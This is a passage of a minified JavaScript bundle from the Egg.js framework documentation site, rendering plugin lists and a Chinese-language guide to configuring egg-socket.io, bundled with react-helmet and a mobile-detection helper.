",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," as template engine solution and support multiple render, which is called by plugin but keeping the consistent render API. Refer to ",r.a.createElement(l["Link"],{to:"./core/view"},"how to use templates"),"\uff0cMore details on ",r.a.createElement(l["Link"],{to:"./advanced/view-plugin"},"template plugin development"),"."),r.a.createElement("p",null,"Template engines available as shown below. For more template engines ",r.a.createElement(l["Link"],{to:"https://github.com/search?utf8=%E2%9C%93&q=topic%3Aegg-view&type=Repositories&ref=searchresults"},"searching")),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-ejs"},"egg-view-ejs")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-handlebars"},"egg-view-handlebars")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/chrisyip/egg-view-pug"},"egg-view-pug")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-xtpl"},"egg-view-xtpl"))),r.a.createElement("h2",{id:"databases"},r.a.createElement(l["AnchorLink"],{to:"#databases","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Databases"),r.a.createElement("p",null,"Official maintained ORM model is ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-orm/blob/master/Readme.md"},"egg-orm")," base on ",r.a.createElement(l["Link"],{to:"https://leoric.js.org/"},"Leoric"),", and the following database plugins are currently available:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-orm/blob/master/Readme.md"},"egg-orm")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mongoose"},"egg-mongoose")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql"),"\uff0crefer to ",r.a.createElement(l["Link"],{to:"./tutorials/mysql"},"MySQL tutorials")),r.a.createElement("li",null,"[egg-graphql]"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},f82q:function(e,t,n){"use strict";t["a"]=function(){if("undefined"===typeof navigator||"undefined"===typeof window)return!1;var e=navigator.userAgent||navigator.vendor||window.opera;return/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(e)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(null===e||void 0===e?void 0:e.substr(0,4))}},fGYQ:function(e,t,n){"use strict";var a=n("3Qq0"),r=n("FU0I"),l={icon:{tag:"svg",attrs:{viewBox:"0 0 1024 1024",focusable:"false"},children:[{tag:"path",attrs:{d:"M988 548c-19.9 0-36-16.1-36-36 0-59.4-11.6-117-34.6-171.3a440.45 440.45 0 00-94.3-139.9 437.71 437.71 0 00-139.9-94.3C629 83.6 571.4 72 512 72c-19.9 0-36-16.1-36-36s16.1-36 36-36c69.1 0 136.2 13.5 199.3 40.3C772.3 66 827 103 874 150c47 47 83.9 101.8 109.7 162.7 26.7 63.1 40.2 130.2 40.2 199.3.1 19.9-16 36-35.9 36z"}}]},name:"loading",theme:"outlined"},o=l,i=n("Il1s"),c=function(e,t){return r["createElement"](i["a"],Object(a["a"])(Object(a["a"])({},e),{},{ref:t,icon:o}))};c.displayName="LoadingOutlined";t["a"]=r["forwardRef"](c)},fIAg:function(e,t,n){"use strict";(function(e){var t=n("3uL2"),a=n.n(t),r=n("lDxF"),l=n.n(r),o=n("zIYL"),i=n.n(o),c=n("FU0I"),s=n.n(c),u=n("G0Yp"),d=n.n(u),m={BODY:"bodyAttributes",HTML:"htmlAttributes",TITLE:"titleAttributes"},p={BASE:"base",BODY:"body",HEAD:"head",HTML:"html",LINK:"link",META:"meta",NOSCRIPT:"noscript",SCRIPT:"script",STYLE:"style",TITLE:"title"},h=(Object.keys(p).map((function(e){return p[e]})),{CHARSET:"charset",CSS_TEXT:"cssText",HREF:"href",HTTPEQUIV:"http-equiv",INNER_HTML:"innerHTML",ITEM_PROP:"itemprop",NAME:"name",PROPERTY:"property",REL:"rel",SRC:"src",TARGET:"target"}),g={accesskey:"accessKey",charset:"charSet",class:"className",contenteditable:"contentEditable",contextmenu:"contextMenu","http-equiv":"httpEquiv",itemprop:"itemProp",tabindex:"tabIndex"},f={DEFAULT_TITLE:"defaultTitle",DEFER:"defer",ENCODE_SPECIAL_CHARACTERS:"encodeSpecialCharacters",ON_CHANGE_CLIENT_STATE:"onChangeClientState",TITLE_TEMPLATE:"titleTemplate"},E=Object.keys(g).reduce((function(e,t){return e[g[t]]=t,e}),{}),b=[p.NOSCRIPT,p.SCRIPT,p.STYLE],v="data-react-helmet",y="function"===typeof Symbol&&"symbol"===typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"===typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},k=function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")},w=function(){function e(e,t){for(var n=0;n<t.length;n++){var a=t[n];a.enumerable=a.enumerable||!1,a.configurable=!0,"value"in a&&(a.writable=!0),Object.defineProperty(e,a.key,a)}}return function(t,n,a){return n&&e(t.prototype,n),a&&e(t,a),t}}(),x=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},j=function(e,t){if("function"!==typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)},S=function(e,t){var n={};for(var a in e)t.indexOf(a)>=0||Object.prototype.hasOwnProperty.call(e,a)&&(n[a]=e[a]);return n},C=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==typeof t&&"function"!==typeof t?e:t},A=function(e){var t=!(arguments.length>1&&void 0!==arguments[1])||arguments[1];return!1===t?String(e):String(e).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#x27;")},L=function(e){var t=P(e,p.TITLE),n=P(e,f.TITLE_TEMPLATE);if(n&&t)return n.replace(/%s/g,(function(){return Array.isArray(t)?t.join(""):t}));var a=P(e,f.DEFAULT_TITLE);return t||a||void 0},T=function(e){return P(e,f.ON_CHANGE_CLIENT_STATE)||function(){}},N=function(e,t){return t.filter((function(t){return"undefined"!==typeof t[e]})).map((function(t){return t[e]})).reduce((function(e,t){return x({},e,t)}),{})},O=function(e,t){return t.filter((function(e){return"undefined"!==typeof e[p.BASE]})).map((function(e){return e[p.BASE]})).reverse().reduce((function(t,n){if(!t.length)for(var a=Object.keys(n),r=0;r<a.length;r++){var l=a[r],o=l.toLowerCase();if(-1!==e.indexOf(o)&&n[o])return t.concat(n)}return t}),[])},I=function(e,t,n){var a={};return n.filter((function(t){return!!Array.isArray(t[e])||("undefined"!==typeof t[e]&&D("Helmet: "+e+' should be of type "Array". Instead found type "'+y(t[e])+'"'),!1)})).map((function(t){return t[e]})).reverse().reduce((function(e,n){var r={};n.filter((function(e){for(var n=void 0,l=Object.keys(e),o=0;o<l.length;o++){var i=l[o],c=i.toLowerCase();-1===t.indexOf(c)||n===h.REL&&"canonical"===e[n].toLowerCase()||c===h.REL&&"stylesheet"===e[c].toLowerCase()||(n=c),-1===t.indexOf(i)||i!==h.INNER_HTML&&i!==h.CSS_TEXT&&i!==h.ITEM_PROP||(n=i)}if(!n||!e[n])return!1;var s=e[n].toLowerCase();return a[n]||(a[n]={}),r[n]||(r[n]={}),!a[n][s]&&(r[n][s]=!0,!0)})).reverse().forEach((function(t){return e.push(t)}));for(var l=Object.keys(r),o=0;o<l.length;o++){var i=l[o],c=d()({},a[i],r[i]);a[i]=c}return e}),[]).reverse()},P=function(e,t){for(var n=e.length-1;n>=0;n--){var a=e[n];if(a.hasOwnProperty(t))return a[t]}return null},R=function(e){return{baseTag:O([h.HREF,h.TARGET],e),bodyAttributes:N(m.BODY,e),defer:P(e,f.DEFER),encode:P(e,f.ENCODE_SPECIAL_CHARACTERS),htmlAttributes:N(m.HTML,e),linkTags:I(p.LINK,[h.REL,h.HREF],e),metaTags:I(p.META,[h.NAME,h.CHARSET,h.HTTPEQUIV,h.PROPERTY,h.ITEM_PROP],e),noscriptTags:I(p.NOSCRIPT,[h.INNER_HTML],e),onChangeClientState:T(e),scriptTags:I(p.SCRIPT,[h.SRC,h.INNER_HTML],e),styleTags:I(p.STYLE,[h.CSS_TEXT],e),title:L(e),titleAttributes:N(m.TITLE,e)}},_=function(){var e=Date.now();return function(t){var n=Date.now();n-e>16?(e=n,t(n)):setTimeout((function(){_(t)}),0)}}(),q=function(e){return clearTimeout(e)},M="undefined"!==typeof window?window.requestAnimationFrame&&window.requestAnimationFrame.bind(window)||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||_:e.requestAnimationFrame||_,F="undefined"!==typeof window?window.cancelAnimationFrame||window.webkitCancelAnimationFrame||window.mozCancelAnimationFrame||q:e.cancelAnimationFrame||q,D=function(e){return console&&"function"===typeof console.warn&&console.warn(e)},U=null,z=function(e){U&&F(U),e.defer?U=M((function(){H(e,(function(){U=null}))})):(H(e),U=null)},H=function(e,t){var n=e.baseTag,a=e.bodyAttributes,r=e.htmlAttributes,l=e.linkTags,o=e.metaTags,i=e.noscriptTags,c=e.onChangeClientState,s=e.scriptTags,u=e.styleTags,d=e.title,m=e.titleAttributes;V(p.BODY,a),V(p.HTML,r),W(d,m);var h={baseTag:$(p.BASE,n),linkTags:$(p.LINK,l),metaTags:$(p.META,o),noscriptTags:$(p.NOSCRIPT,i),scriptTags:$(p.SCRIPT,s),styleTags:$(p.STYLE,u)},g={},f={};Object.keys(h).forEach((function(e){var t=h[e],n=t.newTags,a=t.oldTags;n.length&&(g[e]=n),a.length&&(f[e]=h[e].oldTags)})),t&&t(),c(e,g,f)},B=function(e){return Array.isArray(e)?e.join(""):e},W=function(e,t){"undefined"!==typeof e&&document.title!==e&&(document.title=B(e)),V(p.TITLE,t)},V=function(e,t){var n=document.getElementsByTagName(e)[0];if(n){for(var a=n.getAttribute(v),r=a?a.split(","):[],l=[].concat(r),o=Object.keys(t),i=0;i<o.length;i++){var c=o[i],s=t[c]||"";n.getAttribute(c)!==s&&n.setAttribute(c,s),-1===r.indexOf(c)&&r.push(c);var u=l.indexOf(c);-1!==u&&l.splice(u,1)}for(var d=l.length-1;d>=0;d--)n.removeAttribute(l[d]);r.length===l.length?n.removeAttribute(v):n.getAttribute(v)!==o.join(",")&&n.setAttribute(v,o.join(","))}},$=function(e,t){var n=document.head||document.querySelector(p.HEAD),a=n.querySelectorAll(e+"["+v+"]"),r=Array.prototype.slice.call(a),l=[],o=void 0;return t&&t.length&&t.forEach((function(t){var n=document.createElement(e);for(var a in t)if(t.hasOwnProperty(a))if(a===h.INNER_HTML)n.innerHTML=t.innerHTML;else if(a===h.CSS_TEXT)n.styleSheet?n.styleSheet.cssText=t.cssText:n.appendChild(document.createTextNode(t.cssText));else{var i="undefined"===typeof t[a]?"":t[a];n.setAttribute(a,i)}n.setAttribute(v,"true"),r.some((function(e,t){return o=t,n.isEqualNode(e)}))?r.splice(o,1):l.push(n)})),r.forEach((function(e){return e.parentNode.removeChild(e)})),l.forEach((function(e){return n.appendChild(e)})),{oldTags:r,newTags:l}},G=function(e){return Object.keys(e).reduce((function(t,n){var a="undefined"!==typeof e[n]?n+'="'+e[n]+'"':""+n;return t?t+" "+a:a}),"")},X=function(e,t,n,a){var r=G(n),l=B(t);return r?"<"+e+" "+v+'="true" '+r+">"+A(l,a)+"</"+e+">":"<"+e+" "+v+'="true">'+A(l,a)+"</"+e+">"},Q=function(e,t,n){return t.reduce((function(t,a){var r=Object.keys(a).filter((function(e){return!(e===h.INNER_HTML||e===h.CSS_TEXT)})).reduce((function(e,t){var r="undefined"===typeof a[t]?t:t+'="'+A(a[t],n)+'"';return e?e+" "+r:r}),""),l=a.innerHTML||a.cssText||"",o=-1===b.indexOf(e);return t+"<"+e+" "+v+'="true" '+r+(o?"/>":">"+l+"</"+e+">")}),"")},K=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return Object.keys(e).reduce((function(t,n){return t[g[n]||n]=e[n],t}),t)},J=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return Object.keys(e).reduce((function(t,n){return t[E[n]||n]=e[n],t}),t)},Y=function(e,t,n){var a,r=(a={key:t},a[v]=!0,a),l=K(n,r);return[s.a.createElement(p.TITLE,l,t)]},Z=function(e,t){return t.map((function(t,n){var a,r=(a={key:n},a[v]=!0,a);return Object.keys(t).forEach((function(e){var n=g[e]||e;if(n===h.INNER_HTML||n===h.CSS_TEXT){var a=t.innerHTML||t.cssText;r.dangerouslySetInnerHTML={__html:a}}else r[n]=t[e]})),s.a.createElement(e,r)}))},ee=function(e,t,n){switch(e){case p.TITLE:return{toComponent:function(){return Y(e,t.title,t.titleAttributes,n)},toString:function(){return X(e,t.title,t.titleAttributes,n)}};case m.BODY:case m.HTML:return{toComponent:function(){return K(t)},toString:function(){return G(t)}};default:return{toComponent:function(){return Z(e,t)},toString:function(){return Q(e,t,n)}}}},te=function(e){var t=e.baseTag,n=e.bodyAttributes,a=e.encode,r=e.htmlAttributes,l=e.linkTags,o=e.metaTags,i=e.noscriptTags,c=e.scriptTags,s=e.styleTags,u=e.title,d=void 0===u?"":u,h=e.titleAttributes;return{base:ee(p.BASE,t,a),bodyAttributes:ee(m.BODY,n,a),htmlAttributes:ee(m.HTML,r,a),link:ee(p.LINK,l,a),meta:ee(p.META,o,a),noscript:ee(p.NOSCRIPT,i,a),script:ee(p.SCRIPT,c,a),style:ee(p.STYLE,s,a),title:ee(p.TITLE,{title:d,titleAttributes:h},a)}},ne=function(e){var t,n;return n=t=function(t){function n(){return k(this,n),C(this,t.apply(this,arguments))}return j(n,t),n.prototype.shouldComponentUpdate=function(e){return!i()(this.props,e)},n.prototype.mapNestedChildrenToProps=function(e,t){if(!t)return null;switch(e.type){case p.SCRIPT:case p.NOSCRIPT:return{innerHTML:t};case p.STYLE:return{cssText:t}}throw new Error("<"+e.type+" /> elements are self-closing and can not contain children. Refer to our API for more information.")},n.prototype.flattenArrayTypeChildren=function(e){var t,n=e.child,a=e.arrayTypeChildren,r=e.newChildProps,l=e.nestedChildren;return x({},a,(t={},t[n.type]=[].concat(a[n.type]||[],[x({},r,this.mapNestedChildrenToProps(n,l))]),t))},n.prototype.mapObjectTypeChildren=function(e){var t,n,a=e.child,r=e.newProps,l=e.newChildProps,o=e.nestedChildren;switch(a.type){case p.TITLE:return x({},r,(t={},t[a.type]=o,t.titleAttributes=x({},l),t));case p.BODY:return x({},r,{bodyAttributes:x({},l)});case p.HTML:return x({},r,{htmlAttributes:x({},l)})}return x({},r,(n={},n[a.type]=x({},l),n))},n.prototype.mapArrayTypeChildrenToProps=function(e,t){var n=x({},t);return Object.keys(e).forEach((function(t){var a;n=x({},n,(a={},a[t]=e[t],a))})),n},n.prototype.warnOnInvalidChildren=function(e,t){return!0},n.prototype.mapChildrenToProps=function(e,t){var n=this,a={};return s.a.Children.forEach(e,(function(e){if(e&&e.props){var r=e.props,l=r.children,o=S(r,["children"]),i=J(o);switch(n.warnOnInvalidChildren(e,l),e.type){case p.LINK:case p.META:case p.NOSCRIPT:case p.SCRIPT:case p.STYLE:a=n.flattenArrayTypeChildren({child:e,arrayTypeChildren:a,newChildProps:i,nestedChildren:l});break;default:t=n.mapObjectTypeChildren({child:e,newProps:t,newChildProps:i,nestedChildren:l});break}}})),t=this.mapArrayTypeChildrenToProps(a,t),t},n.prototype.render=function(){var t=this.props,n=t.children,a=S(t,["children"]),r=x({},a);return n&&(r=this.mapChildrenToProps(n,r)),s.a.createElement(e,r)},w(n,null,[{key:"canUseDOM",set:function(t){e.canUseDOM=t}}]),n}(s.a.Component),t.propTypes={base:a.a.object,bodyAttributes:a.a.object,children:a.a.oneOfType([a.a.arrayOf(a.a.node),a.a.node]),defaultTitle:a.a.string,defer:a.a.bool,encodeSpecialCharacters:a.a.bool,htmlAttributes:a.a.object,link:a.a.arrayOf(a.a.object),meta:a.a.arrayOf(a.a.object),noscript:a.a.arrayOf(a.a.object),onChangeClientState:a.a.func,script:a.a.arrayOf(a.a.object),style:a.a.arrayOf(a.a.object),title:a.a.string,titleAttributes:a.a.object,titleTemplate:a.a.string},t.defaultProps={defer:!0,encodeSpecialCharacters:!0},t.peek=e.peek,t.rewind=function(){var t=e.rewind();return t||(t=te({baseTag:[],bodyAttributes:{},encodeSpecialCharacters:!0,htmlAttributes:{},linkTags:[],metaTags:[],noscriptTags:[],scriptTags:[],styleTags:[],title:"",titleAttributes:{}})),t},n},ae=function(){return null},re=l()(R,z,te)(ae),le=ne(re);le.renderStatic=le.rewind}).call(this,n("CwJZ"))},fJSU:function(e,t,n){var a=n("TzLU"),r=Function.toString;"function"!=typeof a.inspectSource&&(a.inspectSource=function(e){return r.call(e)}),e.exports=a.inspectSource},fNvj:function(e,t,n){var a=n("A0UU"),r=a.isFinite;e.exports=Number.isFinite||function(e){return"number"==typeof e&&r(e)}},fRg2:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement("strong",null,"Socket.IO")," \u662f\u4e00\u4e2a\u57fa\u4e8e Node.js \u7684\u5b9e\u65f6\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\uff0c\u5728\u5373\u65f6\u901a\u8baf\u3001\u901a\u77e5\u4e0e\u6d88\u606f\u63a8\u9001\uff0c\u5b9e\u65f6\u5206\u6790\u7b49\u573a\u666f\u4e2d\u6709\u8f83\u4e3a\u5e7f\u6cdb\u7684\u5e94\u7528\u3002"),r.a.createElement("p",null,"WebSocket \u7684\u4ea7\u751f\u6e90\u4e8e Web \u5f00\u53d1\u4e2d\u65e5\u76ca\u589e\u957f\u7684\u5b9e\u65f6\u901a\u4fe1\u9700\u6c42\uff0c\u5bf9\u6bd4\u57fa\u4e8e http \u7684\u8f6e\u8be2\u65b9\u5f0f\uff0c\u5b83\u5927\u5927\u8282\u7701\u4e86\u7f51\u7edc\u5e26\u5bbd\uff0c\u540c\u65f6\u4e5f\u964d\u4f4e\u4e86\u670d\u52a1\u5668\u7684\u6027\u80fd\u6d88\u8017\uff1b ",r.a.createElement(l["Link"],{to:"https://socket.io/"},"socket.io")," \u652f\u6301 websocket\u3001polling \u4e24\u79cd\u6570\u636e\u4f20\u8f93\u65b9\u5f0f\u4ee5\u517c\u5bb9\u6d4f\u89c8\u5668\u4e0d\u652f\u6301 WebSocket \u573a\u666f\u4e0b\u7684\u901a\u4fe1\u9700\u6c42\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," \u63d2\u4ef6\uff0c\u589e\u52a0\u4e86\u4ee5\u4e0b\u5f00\u53d1\u89c4\u7ea6\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"namespace: \u901a\u8fc7\u914d\u7f6e\u7684\u65b9\u5f0f\u5b9a\u4e49 namespace\uff08\u547d\u540d\u7a7a\u95f4\uff09"),r.a.createElement("li",null,"middleware: \u5bf9\u6bcf\u4e00\u6b21 socket \u8fde\u63a5\u7684\u5efa\u7acb/\u65ad\u5f00\u3001\u6bcf\u4e00\u6b21\u6d88\u606f/\u6570\u636e\u4f20\u9012\u8fdb\u884c\u9884\u5904\u7406"),r.a.createElement("li",null,"controller: \u54cd\u5e94 socket.io \u7684 event \u4e8b\u4ef6"),r.a.createElement("li",null,"router: \u7edf\u4e00\u4e86 socket.io \u7684 event \u4e0e \u6846\u67b6\u8def\u7531\u7684\u5904\u7406\u914d\u7f6e\u65b9\u5f0f")),r.a.createElement("h2",{id:"\u5b89\u88c5-egg-socketio"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u88c5-egg-socketio","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u88c5 egg-socket.io"),r.a.createElement("h3",{id:"\u5b89\u88c5"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u88c5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u88c5"),r.a.createElement(o["a"],{code:"$ npm i egg-socket.io --save",lang:"bash"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5f00\u542f\u63d2\u4ef6\uff1a")),r.a.createElement(o["a"],{code:"// {app_root}/config/plugin.js\nexports.io = {\n  enable: true,\n  package: 'egg-socket.io',\n};",lang:"js"}),r.a.createElement("h3",{id:"\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e"),r.a.createElement(o["a"],{code:"// {app_root}/config/config.${env}.js\nexports.io = {\n  init: {}, // passed to engine.io\n  namespace: {\n    '/': {\n      connectionMiddleware: [],\n      packetMiddleware: [],\n    },\n    '/example': {\n      connectionMiddleware: [],\n      packetMiddleware: [],\n    },\n  },\n};",lang:"js"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u547d\u540d\u7a7a\u95f4\u4e3a ",r.a.createElement("code",null,"/")," \u4e0e ",r.a.createElement("code",null,"/example"),", \u4e0d\u662f ",r.a.createElement("code",null,"example"))),r.a.createElement("h4",{id:"uws"},r.a.createElement(l["AnchorLink"],{to:"#uws","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"uws"),r.a.createElement("p",null,r.a.createElement("strong",null,"Egg Socket \u5185\u90e8\u9ed8\u8ba4\u4f7f\u7528 ",r.a.createElement("code",null,"ws")," \u5f15\u64ce\uff0c",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/uws"},"uws")," \u56e0\u4e3a",r.a.createElement(l["Link"],{to:"https://github.com/socketio/socket.io/issues/3319"},"\u67d0\u4e9b\u539f\u56e0"),"\u88ab\u5e9f\u6b62\u3002")),r.a.createElement("p",null,"\u5982\u575a\u6301\u9700\u8981\u4f7f\u7528\uff0c\u8bf7\u6309\u7167\u4ee5\u4e0b\u914d\u7f6e\u5373\u53ef\uff1a"),r.a.createElement(o["a"],{code:"// {app_root}/config/config.${env}.js\nexports.io = {\n  init: { wsEngine: 'uws' }, // default: ws\n};",lang:"js"}),r.a.createElement("h4",{id:"redis"},r.a.createElement(l["AnchorLink"],{to:"#redis","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"redis"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," \u5185\u7f6e\u4e86 ",r.a.createElement("code",null,"socket.io-redis"),"\uff0c\u5728 cluster \u6a21\u5f0f\u4e0b\uff0c\u4f7f\u7528 redis \u53ef\u4ee5\u8f83\u4e3a\u7b80\u5355\u7684\u5b9e\u73b0 clients/rooms \u7b49\u4fe1\u606f\u5171\u4eab"),r.a.createElement(o["a"],{code:"// {app_root}/config/config.${env}.js\nexports.io = {\n  redis: {\n    host: { redis server host },\n    port: { redis server port },\n    auth_pass: { redis server password },\n    db: 0,\n  },\n};",lang:"js"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u5f00\u542f ",r.a.createElement("code",null,"redis")," \u540e\uff0c\u7a0b\u5e8f\u5728\u542f\u52a8\u65f6\u4f1a\u5c1d\u8bd5\u8fde\u63a5\u5230 redis \u670d\u52a1\u5668 \u6b64\u5904 ",r.a.createElement("code",null,"redis")," \u4ec5\u7528\u4e8e\u5b58\u50a8\u8fde\u63a5\u5b9e\u4f8b\u4fe1\u606f\uff0c\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://socket.io/docs/server-api/#server-adapter-value"},"#server.adapter"))),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a"),"\u5982\u679c\u9879\u76ee\u4e2d\u540c\u65f6\u4f7f\u7528\u4e86 ",r.a.createElement("code",null,"egg-redis"),"\uff0c \u8bf7\u5355\u72ec\u914d\u7f6e\uff0c\u4e0d\u53ef\u5171\u7528\u3002"),r.a.createElement("h3",{id:"\u90e8\u7f72"},r.a.createElement(l["AnchorLink"],{to:"#\u90e8\u7f72","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u90e8\u7f72"),r.a.createElement("p",null,"\u6846\u67b6\u662f\u4ee5 Cluster \u65b9\u5f0f\u542f\u52a8\u7684\uff0c\u800c socket.io \u534f\u8bae\u5b9e\u73b0\u9700\u8981 sticky \u7279\u6027\u652f\u6301\uff0c\u5426\u5219\u5728\u591a\u8fdb\u7a0b\u6a21\u5f0f\u4e0b\u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\u3002"),r.a.createElement("p",null,"\u7531\u4e8e ",r.a.createElement(l["Link"],{to:"https://socket.io/"},"socket.io")," \u7684\u8bbe\u8ba1\uff0c\u5728\u591a\u8fdb\u7a0b\u4e2d\u670d\u52a1\u5668\u5fc5\u987b\u5728 ",r.a.createElement("code",null,"sticky")," \u6a21\u5f0f\u4e0b\u5de5\u4f5c\uff0c\u6545\u9700\u8981\u7ed9 startCluster \u4f20\u9012 sticky \u53c2\u6570\u3002"),r.a.createElement("p",null,"\u4fee\u6539 ",r.a.createElement("code",null,"package.json")," \u4e2d ",r.a.createElement("code",null,"npm scripts")," \u811a\u672c\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "dev": "egg-bin dev --sticky",\n    "start": "egg-scripts start --sticky"\n  }\n}',lang:"unknown"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Nginx \u914d\u7f6e")),r.a.createElement(o["a"],{code:'location / {\n  proxy_set_header Upgrade $http_upgrade;\n  proxy_set_header Connection "upgrade";\n  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n  proxy_set_header Host $host;\n  